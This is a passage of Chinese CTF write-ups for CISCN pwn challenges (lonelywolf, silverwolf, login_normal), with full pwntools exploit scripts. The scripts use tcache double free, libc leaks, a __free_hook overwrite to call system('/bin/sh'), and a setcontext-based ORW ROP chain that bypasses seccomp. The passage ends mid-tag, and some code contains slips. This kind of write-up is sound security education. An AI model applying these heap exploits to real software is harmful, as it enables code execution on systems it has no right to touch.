&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(system_addr)))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​        稍微调一下。下断点在改fd为tcache+0x10，再申请到对应chunk之后。</p>\n<p>​        可以看到现在tcache管理chunk显示bin中有0xff个bin，这也是我们double free后必然的结果。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-08%20%E4%B8%8B%E5%8D%889.41.25.png\" alt=\"截屏2022-04-08 下午9.41.25\"></p>\n<p>​        </p>\n<h5><span id><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-08%20%E4%B8%8B%E5%8D%8810.07.22.png\" alt=\"截屏2022-04-08 下午10.07.22\"></span></h5><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-08%20%E4%B8%8B%E5%8D%8810.08.52.png\" alt=\"截屏2022-04-08 下午10.08.52\"></p>\n<p>​        edit后，从chunk content开始的内存被覆盖为了垃圾数据。如果我们此时free这个堆会怎样呢？</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-08%20%E4%B8%8B%E5%8D%8810.10.34.png\" alt=\"截屏2022-04-08 下午10.10.34\"></p>\n<p>​            可以看到，chunk的bk和fd位被修改为了一串地址。这串地址指向<code>main_arena+96</code>。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-08%20%E4%B8%8B%E5%8D%8810.11.30.png\" alt=\"截屏2022-04-08 下午10.11.30\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-08%20%E4%B8%8B%E5%8D%8810.12.24.png\" alt=\"截屏2022-04-08 下午10.12.24\"></p>\n<p>​        这样相当于我们已经leak 了libc，但是为什么这一串fd和bk会是指向<code>main_arena</code>呢？</p>\n<p>​        其实不难想。</p>\n<p>​        看到这个指向<code>main_arena</code>的偏移时，其实大概就会意识到这其实就是unsortedbin leak。我们先前将tcache管理chunk的idx覆盖为了垃圾数据，相当于将整个tcache结构破坏了。所以此时如果我们在pwndbg中查看tcache bin的情况，会发现tcache的每一个thread的chunk都已经被填满了。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-08%20%E4%B8%8B%E5%8D%8810.18.35.png\" alt=\"截屏2022-04-08 下午10.18.35\"></p>\n<p>​        所以相当于此时已经没有tcache了。</p>\n<p>​        当我们free这个堆块，就相当于free一个size为251的chunk，自然会被放入unsorted bin。后面的leak也就理所应当了。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-08%20%E4%B8%8B%E5%8D%8810.14.43.png\" alt=\"截屏2022-04-08 下午10.14.43\"></p>\n<h4><span id=\"allocate-to-free_hook\">allocate to free_hook</span></h4><p>​        当leak了地址，我们可以再次覆盖chunk fd，分配chunk至<code>free_hook</code>,并将其改为<code>system()</code>。</p>\n<p>因为tcache结构已经完全破坏了，所以就直接fastbin double free来修改fd就好了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x40</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"><span class=\"comment\">#free_hook = 0x12345678</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(free_hook))</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x40</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(system_addr))</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x40</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">&quot;/bin/sh;&quot;</span>)</span><br><span class=\"line\">free()<span class=\"comment\">#getshell</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>6291598289251616072</p>\n<h4><span id=\"exp\">exp：</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc-2.27.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&quot;./lonelywolf&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;./libc-2.27.so&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = <span class=\"number\">0x12345678</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">idx,size</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Size: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>(<span class=\"params\">idx,data</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">    p.sendline(data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span>():</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>():</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">4</span>))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x78</span>)<span class=\"comment\">#idx0</span></span><br><span class=\"line\">free()</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x78</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">heap_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;heap_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(heap_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\">tcache_addr = heap_addr - <span class=\"number\">0x260</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(tcache_addr + <span class=\"number\">0x10</span>))</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x78</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x78</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">64</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">show()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">data = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">malloc_hook = data - <span class=\"number\">0x70</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;malloc_hook =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(malloc_hook)))</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = malloc_hook - libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">free_hook = libc_base + libc.symbols[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;free_hook =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(free_hook)))</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;system_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(system_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x40</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#free_hook = 0x12345678</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(free_hook))</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x40</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(system_addr))</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x20</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">&quot;/bin/sh;&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2><span id=\"总结\">总结</span></h2><p>​        这道题算做完了，还是因为之前没有怎么做过tcache的题，所以并不是很熟悉，所以算是学到了新知识，包括破坏tcache结构以及绕过tcache的key检测。不过这些方法都是因题而异的，不过确实拓宽了眼界。</p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["HEAP - Tcache"]},{"title":"SilverWolf","url":"/2022/04/10/ciscn_2021_silverwolf/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-DJGfhAnX\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h1><span id=\"overview\">overview</span></h1><p>​        这个题在程序上与lonewolf只有一个区别就是开了沙箱，需要orw，但是堆上的seccomp和栈上的利用难度可以说是毫无关系，因为之前已经做了lonelywolf，并且从来没有做过堆上的orw，漏洞点就不看了，只关注于orw的实现吧。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8A%E5%8D%888.57.54.png\" alt=\"截屏2022-04-10 上午8.57.54\"></p>\n<p>​        <code>init()</code>过程中开启了seccomp，禁用了除orw以外的所有系统调用。</p>\n<h1><span id=\"利用\">利用</span></h1><h2><span id=\"orw前的一些操作\">orw前的一些操作</span></h2><p>​        orw part之前的利用可以参考：<a href=\"https://fuurinko.github.io/2022/04/06/ciscn_2021_lonelywolf/\">https://fuurinko.github.io/2022/04/06/ciscn_2021_lonelywolf/</a></p>\n<p>​        leak heap及之前的操作都可以照搬。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc-2.27.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&quot;./silverwolf&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;./libc-2.27.so&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">idx,size</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Size: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>(<span class=\"params\">idx,data</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">    p.sendline(data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span>():</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>():</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">4</span>))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x78</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">show()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">heap_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;heap_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(heap_addr)))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>测试一下。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8A%E5%8D%889.12.58.png\" alt=\"截屏2022-04-10 上午9.12.58\"></p>\n<p>​        好乱啊呜呜。早就听说会影响堆风水，没有想到真的这么恐怖。</p>\n<p>​        大致测试了一下，新申请的chunk确实还是在top chunk的上方，还算规律。所以leak heap的思路还是没有变化。</p>\n<p>​        但是leak libc的话，之前是通过破坏tcache结构以申请unsorted bin，然后leak，。但是现在的话似乎不太好破坏tcache，本地调试尚且能看到偏移 ，但是如果是远程的话还是不太方便。</p>\n<h3><span id=\"leak-libc\">leak libc</span></h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">edit(p64(heap_addr + <span class=\"number\">0xad0</span>))<span class=\"comment\">#改fd为一个size大于0x80的chunk。</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x20</span>)<span class=\"comment\">#申请到fd指向的chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">    edit(<span class=\"string\">b&#x27;0&#x27;</span>*<span class=\"number\">0x10</span>)<span class=\"comment\">#绕过tcahce double free 检测</span></span><br><span class=\"line\">    free()</span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">data = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">malloc_hook = data - <span class=\"number\">0x70</span></span><br><span class=\"line\">libc_base = malloc_hook - libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libc_base)))</span><br><span class=\"line\">free_hook = libc_base + libc.symbols[<span class=\"string\">&quot;__free_hook&quot;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;free_hook =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(free_hook)))</span><br><span class=\"line\">setcontext = libc_base + libc.symbols[<span class=\"string\">&quot;setcontext&quot;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;setcontext =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(setcontext)))</span><br></pre></td></tr></table></figure>\n<h2><span id=\"rop-chain-to-orw\">rop chain to orw</span></h2><p>​        为了实现orw，显然我们需要程序执行我们构造的，实现orw功能的rop链。rop链的构造比较简单，只需要利用ropper寻找到给出的libc.so中的需要的gadget就好了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x215bf</span> + libc_base</span><br><span class=\"line\">pop_rax_ret = <span class=\"number\">0x43ae8</span> + libc_base</span><br><span class=\"line\">pop_rsi_ret = <span class=\"number\">0x23eea</span> + libc_base</span><br><span class=\"line\">pop_rdx_ret = <span class=\"number\">0x01b96</span> + libc_base</span><br><span class=\"line\">pop_rsp_ret = <span class=\"number\">0x03960</span> + libc_base</span><br><span class=\"line\">syscall_ret = <span class=\"number\">0xd2745</span> + libc_base</span><br><span class=\"line\">flag_addr = heap_addr + <span class=\"number\">0x11b0</span></span><br></pre></td></tr></table></figure>\n<p>​        但是问题随之而来，我们应该如何执行这个rop链呢？显然我们不可能直接将rop链的地址直接填到什么地方去，因而要用到<code>setcontext()</code>这个函数。</p>\n<p>​        在libc-2.27.so下setcontext()`的汇编代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;setcontext&gt;:     push   rdi</span><br><span class=\"line\">&lt;setcontext+1&gt;:   lea    rsi,[rdi+0x128]</span><br><span class=\"line\">&lt;setcontext+8&gt;:   xor    edx,edx</span><br><span class=\"line\">&lt;setcontext+10&gt;:  mov    edi,0x2</span><br><span class=\"line\">&lt;setcontext+15&gt;:  mov    r10d,0x8</span><br><span class=\"line\">&lt;setcontext+21&gt;:  mov    eax,0xe</span><br><span class=\"line\">&lt;setcontext+26&gt;:  syscall </span><br><span class=\"line\">&lt;setcontext+28&gt;:  pop    rdi</span><br><span class=\"line\">&lt;setcontext+29&gt;:  cmp    rax,0xfffffffffffff001</span><br><span class=\"line\">&lt;setcontext+35&gt;:  jae    0x7ffff7a7d520 &lt;setcontext+128&gt;</span><br><span class=\"line\">&lt;setcontext+37&gt;:  mov    rcx,QWORD PTR [rdi+0xe0]</span><br><span class=\"line\">&lt;setcontext+44&gt;:  fldenv [rcx]</span><br><span class=\"line\">&lt;setcontext+46&gt;:  ldmxcsr DWORD PTR [rdi+0x1c0]</span><br><span class=\"line\">&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class=\"line\">&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class=\"line\">&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class=\"line\">&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]</span><br><span class=\"line\">&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]</span><br><span class=\"line\">&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]</span><br><span class=\"line\">&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]</span><br><span class=\"line\">&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class=\"line\">&lt;setcontext+94&gt;:  push   rcx</span><br><span class=\"line\">&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class=\"line\">&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class=\"line\">&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class=\"line\">&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]</span><br><span class=\"line\">&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]</span><br><span class=\"line\">&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class=\"line\">&lt;setcontext+125&gt;: xor    eax,eax</span><br><span class=\"line\">&lt;setcontext+127&gt;: ret   </span><br></pre></td></tr></table></figure>\n<p>​    </p>\n<p>​        可以看到从    <code>&lt;setcontext+53&gt;</code>开始，以rdi为索引对栈上的寄存器进行了一系列的赋值，所以我们只要能够控制rdi，就能够控制其中的寄存器。</p>\n<p>​            一般的heap orw中需要利用到的主要是<setcontext+53>的rsp以及<setcontext+87>，<setcontext+94>的rcx。</setcontext+94></setcontext+87></setcontext+53></p>\n<p>​            <setcontext+94>将rcx压栈，并且127还可以执行ret，于是我们传入的参数就被设置为rcx的值。</setcontext+94></p>\n<p>​        所以在实际利用中，可以将free_hook的值改为<setcontext+53>的地址，并且在堆块对应的a0以及a8偏移处填上rop链的地址以及ret的地址，以执行我们的rop。</setcontext+53></p>\n<p>​        (ps:rop链不能太大，超出0x78范围就寄了，所以不能只选择系统调用，libc中的read和puts函数也可以使用，就能够省下两个gadget的空间)</p>\n<p>rop链如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">open_rop = p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class=\"line\">open_rop = p64(pop_rax_ret) + p64(<span class=\"number\">2</span>) + p64(syscall_ret)</span><br><span class=\"line\"></span><br><span class=\"line\">read_rop = p64(pop_rdi_ret) + p64(<span class=\"number\">3</span>) + p64(pop_rsi_ret) + p64(heap_addr)</span><br><span class=\"line\">read_rop +=  p64(libc.sym[<span class=\"string\">&quot;read&quot;</span>] + libc_base) <span class=\"comment\"># read</span></span><br><span class=\"line\"></span><br><span class=\"line\">write_rop= p64(pop_rdi_ret) + p64(heap_addr)</span><br><span class=\"line\">write_rop += p64(libc.sym[<span class=\"string\">&quot;puts&quot;</span>] + libc_base) <span class=\"comment\"># puts</span></span><br><span class=\"line\">rop = open_rop + read_rop + write_rop</span><br></pre></td></tr></table></figure>\n<h2><span id=\"布置setcontext参数\">布置setcontext参数</span></h2><p>​        首先把rop链写入chunk，对应的chunk地址就是rop链的地址。</p>\n<p>​        接着读入flag。</p>\n<p>​        由于setcontext中，mov rsp与mov rcx在地址上是连续的，所以直接编辑heap_addr + 0xa0的位置为rop地址以及ret地址。</p>\n<p>​        </p>\n<h2><span id=\"修改free_hook为setcontext\">修改free_hook为setcontext</span></h2><p>​        比较常规。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">edit(p64(free_hook) + <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">edit(p64(setcontext + <span class=\"number\">53</span>) + <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x78</span>)</span><br><span class=\"line\">free()</span><br></pre></td></tr></table></figure>\n<p>​        说实话这个题的堆风水是我已经看不懂的程度了，所以大致逻辑我是明白的，具体的偏移真的算不懂了，下次来调一调，我人麻了，现在只想睡觉。</p>\n","categories":["Binary_security"],"tags":["HEAP - Seccomp"]},{"title":"login_normal","url":"/2022/05/30/ciscn_2022_login/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-PirIPzgX\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<p>好久没有写博客了，水一个，后面两天在写完信号与系统大作业以后预计复现一下另外两道题。这题还是蛮简单的也就是两个点，第一操作符逻辑能不能逆出来，第二能不能第一时间反应这个是可见字符shellcode。调试主要都在逆向阶段了，利用真的没有任何难度。主要可能是别的队pwn手还是少了，不然这个题可能解会超过web。</p>\n<h2><span id=\"checksec\">checksec</span></h2><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.44.34.png\" alt=\"截屏2022-05-29 下午6.44.34\"></p>\n<p>libc2.33</p>\n<h2><span id=\"逆向\">逆向</span></h2><p>首先我们在s处可以输入一个比较大的字符串。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.45.35.png\" alt=\"截屏2022-05-29 下午6.45.35\"></p>\n<p>参考2021 ciscn game，先逆出程序指令为<code>opt:1\\nmsg:ro0t\\r\\n</code>格式,在下面三个功能中可以发现，mmap申请了一片4096size的可执行空间，并将s的内容拷贝进去，而需要申请首先需要切换至root。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.48.44.png\" alt=\"截屏2022-05-29 下午6.48.44\"></p>\n<p>并且在最后一句直接执行了s，这里基本可以确定是一个写shellcode的思路了。shellcode的地址储存在rdx寄存器上。</p>\n<p><img 